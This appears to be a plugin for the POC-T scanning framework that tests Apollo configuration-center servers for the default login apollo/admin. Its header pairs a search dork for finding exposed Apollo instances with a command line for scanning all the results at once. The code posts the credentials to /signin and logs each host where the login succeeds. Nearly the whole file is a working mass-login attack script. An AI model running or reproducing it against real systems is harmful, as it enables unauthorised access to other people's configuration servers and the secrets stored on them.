#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   apollo_weak_pass.py    
@DateTime :  2023/9/12 22:05 


@Dork
    app="Apollo"

@Cmdline
    python POC-T.py -s apollo_weak_pass.py -aF app="Apollo"

@Request
```
POST /signin

username: apollo
password: admin
login-submit: 登录
```

@Expected Response
    location not contains "error"
    tips: location == "/"
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/signin")
    poster = {
        "username": "apollo",
        "password": "admin",
        "login-submit": "登录"
    }
    resp = request_ex("post", url, data=poster, timeout=8, allow_redirects=False)
    log.debug(resp)
    if resp:
        location = resp.headers.get("Location", "")
        if "error" not in location and location == "/":
            poster.pop("login-submit")
            msg = "%s\t%s" % (url, poster)
            log.info(msg)
            return True

    return False
